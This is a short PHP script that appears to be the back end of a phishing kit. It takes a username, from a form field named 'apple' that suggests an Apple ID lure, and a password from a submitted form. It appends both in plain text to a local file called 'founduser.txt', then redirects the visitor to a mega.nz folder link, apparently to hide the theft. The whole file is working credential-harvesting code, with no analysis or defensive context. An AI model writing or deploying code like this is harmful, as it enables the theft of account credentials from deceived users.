<?php
 $user = $_POST["apple"];
 $pass = $_POST["pw"];

 $co = "===========================================\n"; 
 $cl = "===========================================\n";
 $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
 $us = "Username: $user\n";
 $pa = "Password: $pass\n";
 fwrite($fileuser, "\n". $co. $us. $pa. $cl);
 fclose($fileuser);
header('Location: https://mega.nz/folder/vIY0BKxC#9U-t5sE1KRmaxSswWN-gAw');
exit();

 exit()
?>

